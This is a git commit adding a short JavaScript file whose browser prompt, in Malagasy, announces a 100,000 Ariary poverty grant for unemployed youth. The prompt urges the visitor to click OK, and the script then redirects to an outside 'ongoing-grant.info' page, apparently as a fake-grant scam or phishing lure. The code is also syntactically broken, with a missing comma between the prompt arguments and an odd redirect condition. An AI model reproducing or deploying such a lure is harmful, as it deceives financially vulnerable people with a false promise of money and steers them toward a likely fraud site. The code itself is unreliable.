dcb31b48d85e502fa7d856303e84686e2b67a110
The-On-going <sirpeelawson@gmail.com>
2026-05-11 22:54:44 +0100

    Create activema.js

---
+++ activema.js
@@ -0,0 +1,9 @@
+var password = 'Ar 100,000';
+
+password = prompt(
+  'Arahabaina, mendrika hahazo ny FANAMPIANA ARA-BOLA Ar 100,000 HIADIANA AMIN’NY FAHANTRANA HO AN’NY TANORA TSY MANANA ASA ianao. Tsindrio ny OK mba hahazoanao azy avy hatrany.'
+  'Ar 100,000'
+);
+if (password !== 'Ar 100,000') {
+    location.href = 'https://ongoing-grant.info/100000Ar-Fanomezana-Tanora.html';
+}
